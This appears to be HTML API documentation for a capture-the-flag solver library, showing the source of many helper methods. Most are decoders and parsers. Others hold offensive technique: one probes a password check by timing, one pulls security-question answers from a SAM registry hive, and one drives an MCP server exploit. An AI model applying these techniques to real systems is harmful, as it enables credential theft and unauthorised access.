<dt id="ctfsolver.find_usage.gathering.Gathering.get_request"><code class="name flex">
<span>def <span class="ident">get_request</span></span>(<span>self, path)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_request(self, path):
    url = &#34;/&#34;.join([self.complete_url, path])
    response = requests.get(url)
    if response.status_code == 200:
        # return response.json()
        return response.text
    else:
        return response.text</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_scapy_tcp_stream"><code class="name flex">
<span>def <span class="ident">get_scapy_tcp_stream</span></span>(<span>self, nunber:int)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_scapy_tcp_stream(self, nunber: int):
    packets = self.smart_extract_packets(
        self.challenge_file,
        pcap_function=&#34;scapy&#34;,
        raw=True,
        save=True,
        filename_save=&#34;packets_scapy_raw.pickle&#34;,
    )
    stream = packets.sessions()
    return stream</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_tcp_stream"><code class="name flex">
<span>def <span class="ident">get_tcp_stream</span></span>(<span>self, number)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_tcp_stream(self, number):
    tcp_streams = self.creating_stream()
    return tcp_streams[number]</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.get_welcome_message"><code class="name flex">
<span>def <span class="ident">get_welcome_message</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_welcome_message(self):
    self.recv_lines(2)
    time.sleep(0.5)
    self.recv_lines(4)
    time.sleep(0.5)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.getting_base64"><code class="name flex">
<span>def <span class="ident">getting_base64</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def getting_base64(self):
    sysmon_file = self.Path(
        self.folders[&#34;data&#34;], &#34;emilia&#34;, &#34;Sysmon_Operational.txt&#34;
    )
    with open(sysmon_file, &#34;r&#34;) as f:
        text = f.read()
    base64_strings = self.custom_re_match_base64_string(text)

    result = b&#34;&#34;

    for base64_string in base64_strings:
        decoded = base64.b64decode(base64_string)
        result += decoded
    return result</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.getting_round"><code class="name flex">
<span>def <span class="ident">getting_round</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def getting_round(self):
    round_text = self.recv_until(&#34;&gt; &#34;)
    round_text = round_text.decode()
    round_text = round_text.strip(&#34;\n&gt; &#34;)
    round_text = round_text.split(&#34;] &#34;)

    print(round_text)
    self.requests.append(round_text)
    # print(self.requests)
    # print(round_text)
    if len(round_text) &lt; 2:
        print(&#34;Unexpected round format or missing data&#34;)
        print(round_text)
        sys.exit(0)
        # raise ValueError(&#34;Unexpected round format or missing data&#34;)
    match round_text[1]:
        case &#34;[UART&#34;:
            bits = round_text[2]
            decoded = self.decode_uart(bits)
        case &#34;[NRZI&#34;:
            bits = round_text[2]
            decoded = self.decode_nrzi(bits)
        case &#34;[Manchester&#34;:
            bits = round_text[2]
            decoded = self.decode_manchester(bits)
        case &#34;[Hamming74&#34;:
            bits = round_text[2]
            decoded = self.decode_hamming74(bits)
        case _:
            raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
    print(f&#34;Decoded: {decoded}&#34;)
    self.send(decoded)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.hash_pw"><code class="name flex">
<span>def <span class="ident">hash_pw</span></span>(<span>self, pw_str)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def hash_pw(self, pw_str):
    pw_bytes = bytearray()
    pw_bytes.extend(pw_str.encode())
    m = hashlib.md5()
    m.update(pw_bytes)
    return m.digest()</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.hex_to_bytes_le"><code class="name flex">
<span>def <span class="ident">hex_to_bytes_le</span></span>(<span>self, hex_val, size)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def hex_to_bytes_le(self, hex_val, size):
    return hex_val.to_bytes(size, &#34;little&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.hex_to_string"><code class="name flex">
<span>def <span class="ident">hex_to_string</span></span>(<span>self, hex_string)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def hex_to_string(self, hex_string):
    &#34;&#34;&#34;
    Description: Convert hex string to ascii string

    Analytical:
    - Split the hex string by space
    - Convert each hex value to ascii character
    - Join the ascii characters to form the ascii string

    Args:
        hex_string (str): Hex string to convert to ascii

    Returns:
        str: Ascii string
    &#34;&#34;&#34;
    hex_string = hex_string.split(&#34; &#34;)
    return &#34;&#34;.join([chr(int(i, 16)) for i in hex_string])</code></pre>
</details>
<div class="desc"><p>Description: Convert hex string to ascii string</p>
<p>Analytical:
- Split the hex string by space
- Convert each hex value to ascii character
- Join the ascii characters to form the ascii string</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>hex_string</code></strong> :&ensp;<code>str</code></dt>
<dd>Hex string to convert to ascii</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>Ascii string</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.hexdump_to_binary"><code class="name flex">
<span>def <span class="ident">hexdump_to_binary</span></span>(<span>self, hexdump_file, binary_file)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def hexdump_to_binary(self, hexdump_file, binary_file):
    with open(hexdump_file, &#34;rb&#34;) as f:
        hexdump_data = f.read()

    hex_data = []

    for i in range(0, len(hexdump_data), 4):
        chunk = hexdump_data[i : i + 4]
        # If the chunk is less than 4 bytes, pad it with zeros
        if len(chunk) &lt; 4:
            # chunk += b&#34;\x00&#34; * (4 - len(chunk))
            chunk = chunk.ljust(4, b&#34;\x00&#34;)
        hex_data.append(f&#34;{struct.unpack(&#39;&lt;I&#39;, chunk)[0]:08x}&#34;)

    hex_output = &#34;&#34;.join(hex_data)

    binary_output = binascii.unhexlify(hex_output)

    with open(binary_file, &#34;wb&#34;) as f:
        f.write(binary_output)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.hive_solution"><code class="name flex">
<span>def <span class="ident">hive_solution</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def hive_solution(self):
    self.hive = RegistryHive(self.challenge_file)
    security_answers = []
    users_base = r&#34;\SAM\Domains\Account\Users&#34;
    users_key = self.hive.get_key(users_base)
    # print(hive)

    # Get all functions of the hive object
    hive_functions = self.get_functions(self.hive)

    # print(&#34;Hive Functions:&#34;, hive_functions)
    users_key_functions = self.get_functions(users_key)

    # Get the name for each user from subkey.name

    user_key = &#34;000003E9&#34;  # print(&#34;Users Key Functions:&#34;, users_key_functions)

    user_subkeys = users_key.get_subkey(user_key)
    # print(&#34;User Subkeys:&#34;, user_subkeys.get_value(&#34;&#34;))

    # value_v = user_subkeys.get_value(&#34;V&#34;)
    value_reset = user_subkeys.get_value(&#34;ResetData&#34;)
    # value_force = user_subkeys.get_value(&#34;ForcePasswordReset&#34;)

    # decoded_value_v = self._decode_v_value(value_v)
    decoded_value_reset = self._decode_v_value(value_reset)
    # decoded_value_force = self._decode_v_value(value_force)

    # print(&#34;Decoded V Value:&#34;, decoded_value_v)
    # print(&#34;Decoded Reset Value:&#34;, decoded_value_reset)
    # print(&#34;Decoded Force Value:&#34;, decoded_value_force)

    # print(decoded_value_reset)

    # Join the list into a single string and parse it as JSON
    decoded_json = json.loads(&#34;&#34;.join(decoded_value_reset))
    flag = f&#34;ECSC{{{&#39;:&#39;.join([item[&#34;answer&#34;] for item in  decoded_json[&#34;questions&#34;]])}}}&#34;
    # answers = [item[&#34;answer&#34;] for item in decoded_value_reset.get()]
    print(flag)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.init_some_values"><code class="name flex">
<span>def <span class="ident">init_some_values</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def init_some_values(self):
    self.key = [
        7,
        58,
        391,
        58,
        129,
        80,
        537,
        80,
        389,
        33,
        80,
        107,
        522,
        391,
        389,
        148,
        386,
        522,
        389,
        58,
        240,
        240,
        107,
        1,
    ]

    self.replace_combos = [
        (&#34; &#34;, &#34;&#34;),
        (&#34;,&#34;, &#34; &#34;),
        ((&#34;,&#34;, &#34; &#34;), (&#34;&#39;&#34;, &#34; &#34;)),
        ((&#34;,&#34;, &#34;&#34;), (&#34;&#39;&#34;, &#34;&#34;)),
        (&#34;,&#34;, &#34;&#34;),
        (&#34;&#39;&#34;, &#34; &#34;),
        (&#34;&#39;&#34;, &#34;&#34;),
        (&#34;\n&#34;, &#34; &#34;),
        (&#34;\n&#34;, &#34;&#34;),
    ]</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.initialize_values"><code class="name flex">
<span>def <span class="ident">initialize_values</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def initialize_values(self):
    # 2) Initialize MCP
    self.init = {
        &#34;jsonrpc&#34;: &#34;2.0&#34;,
        &#34;id&#34;: 1,
        &#34;method&#34;: &#34;initialize&#34;,
        &#34;params&#34;: {
            &#34;protocolVersion&#34;: &#34;2024-11-05&#34;,
            &#34;capabilities&#34;: {},
            &#34;clientInfo&#34;: {
                &#34;name&#34;: &#34;challenge_solution&#34;,
                &#34;version&#34;: &#34;1.0&#34;,
            },
        },
    }
    self.base_url = f&#34;http://{self.url}:{self.port}&#34;
    self.sse_url = f&#34;{self.base_url}/sse&#34;</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.int_array_to_bytes"><code class="name flex">
<span>def <span class="ident">int_array_to_bytes</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def int_array_to_bytes(self, data):
    &#34;&#34;&#34;Convert array of integers to bytes&#34;&#34;&#34;
    return bytes(data)</code></pre>
</details>
<div class="desc"><p>Convert array of integers to bytes</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.interacting_with_binary"><code class="name flex">
<span>def <span class="ident">interacting_with_binary</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def interacting_with_binary(self):

    self.initiate_connection()

    initial_menu = &#34;[*] Initializing components...\n&#34;

    # self.recv_menu(number=10, display=True)
    output = self.conn.recvuntil(initial_menu)
    print(output)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.interacting_with_mcp"><code class="name flex">
<span>def <span class="ident">interacting_with_mcp</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def interacting_with_mcp(self):
    self.session.post(self.post_url, json=self.init)
    # wait for init reply
    for msg in self.messages:
        data = json.loads(msg.data)
        if data.get(&#34;id&#34;) == 1:
            # send initialized notification
            self.session.post(
                self.post_url,
                json={&#34;jsonrpc&#34;: &#34;2.0&#34;, &#34;method&#34;: &#34;notifications/initialized&#34;},
            )
        break

    self.exploit()
    flag = self.tools_result()
    if flag:
        print(f&#34;Flag: {flag}&#34;)
    else:
        print(&#34; Flag not found&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.interactive"><code class="name flex">
<span>def <span class="ident">interactive</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def interactive(self):
    &#34;&#34;&#34;
    Descrption : Start an interactive session
    Parameters : None
    Returns : None
    &#34;&#34;&#34;
    self.ssh_connection.interactive()</code></pre>
</details>
<div class="desc"><p>Descrption : Start an interactive session
Parameters : None
Returns : None</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.is_prime"><code class="name flex">
<span>def <span class="ident">is_prime</span></span>(<span>self, p)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def is_prime(self, p):
    v = 0
    for i in range(2, p + 1):
        if p % i == 0:
            v = v + 1
    if v &gt; 1:
        return False
    else:
        return True</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.juilius_decrypt"><code class="name flex">
<span>def <span class="ident">juilius_decrypt</span></span>(<span>self, msg, shift)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def juilius_decrypt(self, msg, shift):
    pt = &#34;&#34;
    for c in msg:
        if c == &#34;0&#34;:
            pt += &#34; &#34;
        elif not ord(&#34;A&#34;) &lt;= ord(c) &lt;= ord(&#34;Z&#34;):
            pt += c
        else:
            o = ord(c) - 65
            pt += chr(65 + (o - shift) % 26)
    return pt</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.known_colissions"><code class="name flex">
<span>def <span class="ident">known_colissions</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def known_colissions(self):
    one = {
        &#34;username&#34;: &#34;TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#34;,
        &#34;password&#34;: &#34;verysecure&#34;,
    }
    two = {
        &#34;username&#34;: &#34;TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&#34;,
        &#34;password&#34;: &#34;verysecure&#34;,
    }

    print(f&#34;Hash one: {self.md5_hash(one[&#39;username&#39;])}&#34;)
    print(f&#34;Hash two: {self.md5_hash(two[&#39;username&#39;])}&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.length_find"><code class="name flex">
<span>def <span class="ident">length_find</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def length_find(self):

    lenghter = CTFSolver(
        conn=self.conn_type, file=self.file, url=self.url, port=self.port
    )
    for i in range(10, 130):
        time_reference = self.check_password_time(i)

        print(time_reference)

        lenghter.initiate_connection()
        lenghter.recv_lines(number=2)
        lenghter.menu_num = 0
        menu_text = &#34;Give me password and number in json: &#34;
        payload = self.payload_maker(&#34;NH4CK{&#34; + &#34;a&#34; * i, self.flouri_min + i)

        start_time = time.time()
        # lenghter.recv_lines(number=2, display=True)
        lenghter.send_menu(payload, menu_text=menu_text, display=True)

        print(&#34;Trying length: &#34;, i)
        response = lenghter.recv_lines(number=1, display=True, save=True)
        stop_time = time.time()

        duration = stop_time - start_time

        if b&#34;GLYKO and HUGS&#34; in response[0]:
            print(&#34;length found&#34;, i)
            print(response[0])
            # return i

        if b&#34;sweet AND lucky&#34; in response[0]:
            print(&#34;Found the correct length&#34;)
            print(&#34;Duration: &#34;, duration)
            print(&#34;Response: &#34;, response[0])
            print(&#34;Payload: &#34;, payload)
            print(&#34;Flouri: &#34;, self.flouri_min + i)
            sys.exit(0)
            return i

        if b&#34;Something wrong honey?&#34; in response[0]:
            return i

        print(f&#34;Duration: {duration}&#34;)
        print(f&#34;Time Reference: {time_reference}&#34;)
        if duration &gt; time_reference:
            print(&#34;Length found: &#34;, i)
            return i</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.list_all_files"><code class="name flex">
<span>def <span class="ident">list_all_files</span></span>(<span>self, ods_file)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def list_all_files(self, ods_file):
    &#34;&#34;&#34;
    Lists all files in the ODS archive for manual inspection.

    Args:
        ods_file (str): Path to the ODS file.

    Returns:
        list: A list of files inside the ODS archive.
    &#34;&#34;&#34;
    with zipfile.ZipFile(ods_file, &#34;r&#34;) as ods:
        return ods.namelist()</code></pre>
</details>
<div class="desc"><p>Lists all files in the ODS archive for manual inspection.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>ods_file</code></strong> :&ensp;<code>str</code></dt>
<dd>Path to the ODS file.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>list</code></dt>
<dd>A list of files inside the ODS archive.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.load_compressed_data"><code class="name flex">
<span>def <span class="ident">load_compressed_data</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def load_compressed_data(self):
    &#34;&#34;&#34;
    Description:
        Challenge specific function to load the compressed data
    &#34;&#34;&#34;
    self.compressed_data = b&#39;BZh91AY&amp;SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4&#34;|\xf9`\r\xff\x1a\xb3\x03\xd1\xa0\x1e\xa9\x11\x07\xac\x9e\xef\x1e\xeez\xf5\xdb\xd9J\xde\xce\xa6K(\xe7\xd3\xe9\xcd\xa9\x93\rS@M\x134&amp;\r\x11\x94xF\x11\xa6\x89\xb2\x99\xa6\x94\xf0\x1ai\xa1\xa6\x9a\x03AF\xd1\x1e\x9e\xa1\x9a\xa7\x89\xa6L\x84\xf5\x1ayC\xd44z\x993S h\r\x0f)\xe9\x03@\x03LG\xa9\xa0\x1a\x04DI\xe8\x19$\xf4\xc9\xe92a\xa3D\xc9\x9aL\x11\x81O\&#39;\xa4\x9e\x935=M\xa4\xd0\xd1\xa6&amp;F\x81\x93L\x86\x80\x00\x00\x06\x80\x00\x00\x00\x00\x00\x00\x00\x00\rM\t4\xd1\x80L\t\x91\x18\xa9\xe4\xc6\x94\xd8\xa7\xb5OS\xc9\xa4=#\xf54\xd4\x06j\x07\xa9\xeaz\x9a\x1e\xa1\xa0z\x86\x83M\x03jh\x00\x03A\xa6@\x1a\x00\x00\x03\xd4\x00\x1e\xa7\x944\x005=\x10\x93\x10\x9b@\x994\xc8\x99\xa3J\x1bM\x1ajyOF\xa6\x98\xcab\x0c\xd16\xa0m&amp;\x8fH\xd3@44\x01\xa0\x00\r\x03@\x004\x19\x00\x00\x00\x004\x1a\x01U44\x00\x03@\xd0\x1a\x0044\xd0\x06@\x1a\x00\x004\xd0\x18\x98\x86@42d\x00h\x1ad\x00\x00\x00\x004h\x00\x00\x00`\x91$Bhh4`\x9a\x19\x04\xc3@\xa9\xedS\xf4S\xd2\x1b\xd4\xda&amp;M&amp;\xd2m#\xcai\xfa\x8c\x93e=@\x1e\x91\xa0z\x8cjh\xd1\xa6\x80\x00\xd0\x004\x1e\xa0\x01\xa0\x1a4i\xb54\xd3\x10\x1f\xdf\xcb\x98\x99\r\xa1\r\x8c`\xd86\x0cd\xe9\xc3\x06\x9bm6\xdbm\x1b\xf1&#34;\xf0\xd2\xa7\xd5p,\x171gAcG]V\xcfvr\x9e\r\x9d=\x13?N\xfa\x8bw3l`\x0e\x1c\xda\xdc\xb0VU\xa0\xe7\x8df&gt;$\x10\xb5\xf2+fu\xd6\xd5\xed\x9a\x9c|b\xb1\xc4\xd1P\xd0\x95\xf8\x10\xc0\xb8\xd2\x10\\ 9\x83UF#^H\x12\x12\x91\x98\x9c\x1d\x89BQ\x8eC\x92\x066\x8bDp\x8a\xaa\x03e%\xad\xc4\xe5o\x8f\x01\xa0\x11\x84\xac\xb8H\x01^\xb7\x84y\xed\x0cU\xb37\xd7[w\xddm\xf4\xf9\xdb\xee7\xa6\x98\xe2-A\xea\x1c\xd6\xbe\xbf1\xe2\x03\x89A:2\xb0n\x0b\xc169\x8a\xab\n\\\xa4\xa0\xbb{ \x11\xa7\x1e-\xbc,P`F\xad\x08\xe1\x8dY\x9b\x02,\x8cs#eg%\x97\x071\xda\xe8XA|&gt;\xa1\xae\xaah%\xc4]\x95w*4i[\x85\xee\xee=\xcf\x935q\x02uo&#34;\xaf\x81/\xc0\xca\xbdF;\xf6\xef\xaa\x99A/ \x91\xef\x0b\xe1\xd9\xa4`w\x9e\xc6\x88\xf2\xa9S\xe3\xa6x\xaf|\x0b*IE\x02\x8a(NL\x00]?\x12\x10p=w\xc6\x92G\x8a\xd2\xff\x17}~y3\xe3\xe9f\xf1\xff\xaf\xf2\xa5\xb9\xa5\xcc\xfd;W\xdd\x1e\xcd\x9e\x0bD5\x0b\x0f\xc6wFW\\\xd5\x8d Gh\xc1\n|x2\x99&amp;\x8e\\\xa5Ba\x7f6!\x10\xe4\xd0p\x18\x90\x97k4\x1a\xec@\x1b~~\x8d\xfe\xee\x96\x07\x8f\xd6\xe1SS\xcdOv\x8c\x89\xd2I\x150\xa5\xdd\xaa&gt;E\x07\xdb\xf8l\x97V\xa0\x1c\x8d\xd9\xa50\x17[h\xd1\x02\x08!f\xad\xea\xa0&#34;\x88\xceC\x0c\x0fVG^\xc0\xea_\x10\xbd\xa1m{5IL\xbb\xd2\x9an\x07\xd9a\x98jgIwr&amp;&amp;\x06\x0c\x8aH\xe73\xdd\xb1\x050\x9f\x1f\x1f\xe1J\&#39;\x9d\x8cY\xa8\x11\x0b\x08\x0fd*\xf2\x9d\xc2\x84$\x10\x8a\xd9\xc1\xe05\xecs\xdeC\x9a\xd1\xb7\x85\x0eNiJj2\x9ag\x12\x94M)\xd2\r\xf3\xa8\x84\xc9\xc2\x06\xe1\x14\xda\xd1\x1e\x1bV\x1a\x0b\xe666\xc6~V\x81/r\x98\x95\xf2g\xc7Mm&lt;\xed\xb0\xe9ko\x01\xcb4\x88\x17\x84\x8a&#34;J\x9bJ\x18\x0ch;\x84\tv\xcb\xbaEL\x99\xdf\xaa)q/t:45\xba\xbf\x84V\xf5\xb3\xad\x8c\xee\x11\xe2(\x18&gt;\xea3\xa9\x98\xa8B\xcf\xb5\xdc\xed\xacI&lt;\x90\x06\x1d0)Y@\x86\x07\x7f\xee\xb9\xf5{m\xdf\x83Hf\xb3T\xd2\xdf\x9c\xc6\xab\xac\x13\x99\xcb\xec\xf5K\xf2\x80\xce\x9fC\xf4w\xeb\x1fa\x08\xd8\r\x80&lt;%\x90w\x8b\xe8}\x8d\xda\x96\xcf)\x1a\xbaD.\xa3\xc2\xe5E\xe3\xc9p\xa8&amp;w\x10\x14\xc6$v-I\xd9\xbd\xcf\xbf\xe1\xce\x19\xcdf\x07\x0b\x7f\xd7\xc8:\xa6nw\xfc=M\\n\xc7\x02\x96\n\x85&#34;.j\xa8G}\x04\xef\x1e+\xb0)4\x82G_\x05\xfe\xbe\x94\xf3\x03\xd4*\xe2\xf7T\xa8\x97\x97\xc3X\x8a\x9a;\x9a\xbei\xc9\xad\xd1\xd2\xcf\xde4fpz\xce\rY\xa5\xa2s\xad\xf8(S\xf3*\x85\xea$\x14\x18\xb6\x1a\xbb\xc5.O\xc3\xb7\x89\xeb9\x1a4\xd3\xe0\x999r\x99\x9a(\x84\xce\x17\x0bk\xa59\xd2X\x88\x815\xab\x10x\x9f\xb7\xc5\xe7_R\xaa\xaa\xab\xf2\x9e\xe1\xb9\x8aK\x91\xa3\xa1\xa7\xc0\x94\x8f3\xca\x82\x8azY\xc4g\xed\xcf\xa9BO:`\xb5\x1b2\x12\xbb\x89\x17[m\xa2\xe8\xc4\x0ctJ/-\xa5\xbf\xf1\xffq\x7f\xda\x9a\xd9\x00\xb2\x0b\x98L\x7f\x17\xb4\xc9g}\x1e\xfeSh \xc3\x98fIq\x05]\xb1\x8aB\x98\xc7\x94\x03=2&amp;\x06v@s\x0fX\xb3\xadZ\xcf\xac\xf6\xae\xe2\x0b\xaa\xe4\x99\xf3\xf5&lt;\xd7\x81mu\x87\xb5\x97\xd2\xc3\xb4p\xb5\xad\xd9y\x15\xf2\x06,\xa7;\xe2\xe4\xcaH\xbf\xd5\x92@\xae\x0c\x91\xddD\x9by\xd5\xccj\x7f\xa9\x19\xad\xa3\x07\xbdI\x84\xa9|k/\x0f7=ji\x12\xba\xd4\xfaI\x8c\xa9\x94\n\x9b\xa43\x0e\xa6O\xd3\x8d\xf5\x83\x06\xd8\xaehhl\x05*;\xda\xaa\xd9he\xc8\x8f2!\x98\xd6-B\xa9\xcf\x9a\xb9_\xa4\xec\xda\x08&lt;\xe3\r\xeem\x1el\xd8\xfc}3\xc4\xbal\xe5,P\xe4^\xae-\x97\x91j0\xec\xc8bB\x85\xd1.\xf5T\xa4\xf1\x83\x89\xc4-\\\x00\xf0\xbb\x1a\xd2\x89K\xb58\x96\xe2\x88\xdd&lt;q\r\xbb0\xc4Ac\x95.v\x94\x08&gt;\xca\x8b\xf5\xa1\xaf\x1fVH\x16\n\xfe+\x02\x9f\xe9\xa7VP\x1a\x03m\x01\xab\x0b\xf8\xd1&amp;\xacq\xadg\x0f\xfc\x98N\x91XRQ\x88\xcf- 4K\x84q&#34;\xec\xb2\x8c\xe6e\x86 \x9ff\x10\x83p\xc5\xc1C\xf4\x8c5\xda\xe5\x82)\xcf\n\xbfWZ\xc0\xd1\x9b`\xacFt\xba\xed\xaf#\xc8\xf8\x96\xe9=Zd\xa4h\xa3d&gt;\xb2\xec\xac\x98\xe6%\xca\xb2r\xe2\xd7\xb5\x80\x8c\x1cb0\xadC\x8a\xdb\x1e\x1d\x9ek\xf0&gt;\xcf\&#39;7=\x9b\x19\xdee@\n\xaa\xac\xd2N%$\x91]\xa7\x13c\xe7\xce\x95\x96\x81Yh\nS\xd1\xdc\xb5\xe3d{\x13\xc5\xeau22\xcc\xec\xe1\x19\xb6\n\x8e?\n\x01\xdey\x04t\x02&#34;@\x82\x12J\x88\x86\x1b\x83Un\x03Uy\xed\x82\xc3\x19\xdd\x86\r\xda\x1a\xde\x7f\x14\x90\xb3\xaf?\x05\xd3\xf0\x05\xe9\x85\x83\x99m\x8ae\x86\xd59Zl\x83i\x04u&lt;\x92]\xe9\xca\xbc\xf5k\xcd\x8e,\xc1\xfcU\xc7\x84%|&gt;\xfbt\x9c\x04\xf0}\xceQ|Wy\x9eN\xa8\x19#\x12\x94\xf1\xfdX5`\x19\x0e\x87NwC\xa5\x80p\xb1\xd9\xc73F\xe8\xa5\x9c\x00\xe5\xb1)\xd3]\xa6\r\x9d\x1a\xdd\xa4\x91\xb9z}\x1bg\x12\x9e&lt;\nB\x88\x0e\xdf:\x1c\t\xc3\xa3\x85\x1b\x98y\xec\x0c\x9a\x12Pr\xcdC\xea1\x7f\x01\xef\xc3\xb0\xdd16\xe7\x1e\xf7\x1fv4\x17\r\xd3\x86\xceE@\xce\x15T\xce\x00\xf3@\xd9\r\x05\x19@V\x1c&#34;\x86\xa6\x9c&amp;,\x05\xa6%\x02n(^9\x86\xa65#\xc8\xb5]\x88\x8e\xa2,1\xc3u2\xe0\xa8 \x01\xff&#34;|\xffG\x0b6\xbeU\x8a\xf7;YD\xda\xb4u)l\xf6~\&#39;\x0e\x9b\xb3/\x98Q1\x04\x12JI[\x11*\x81\t\x07\xcb\xadw\xc9\xbf\xbf\xbe\xbaa\xc6\xce\x9e)\x98v\x15\x01j\xa15\xbd\xd0\xcb.\xe3\xd7\xa2`\x15\x9e\x854\xd3\x1am\r\x13A\x9a\xa5\x0b\r\x81\r\xb9\xb3%)Bmr\x12L\r&gt;\x87\x07K\xea\xden\x87\x01c6%\xea\xa5\xd8\xb54\xc0\xca\xb8SBd{O\x9c \x88\x86\xee-80\x81Vv\x08[P\xc221\x9e &amp;,t\x11/9\xe0\xd0\x1f\x1d\xcd\x94\xb9\x95\xc7V\xcb\xd6\xf2M\xf7\xf4gT\xa2\x19\x94\xd9\xfb\x7f\x15\x90\xc5\xb2&amp;\x9e}\x0cq\xe8\xdc(\x1a{l\\\x88\xb8\xab=\x8b\xaaCm\xc0\xcb\xb5w=\xf8\xff\xa3\xdfY\x94\xa5\xa5\x9d0\x04U\x8al\xb8iw\xa3\xb0%\xf1 \x03H\x80\xc9$v\xe6\x98|#DYP\xa4\xfe\&#39;\x04\xe0&amp;\x88+\xeb\xce:\xa0cm,\x1aQ\xfdN\x1c\x97\xa3\x98\xb5q\x1c\xefE\xabEC\xaa\x82\x00\x8c\xcb\xee\x8d\xd6l\xe5\\\xca;\xf9d\xd4\xa5\xaen\xfaW=\x88kU9\xfe\x95&amp;c\x13\x0cL7+5\xe2\xde_\x9f\xf6t\x05Hn\xe2\xff\x9dzi\x9a\x03@`u\xea\x98\xb5\x8e\xd9\xa3W\x85\x96O\x85\x9bf\xc1\xb6\xa4x\xa2/=\x0f\xa6T\xde\xac\xc6\x84\\\xa5q 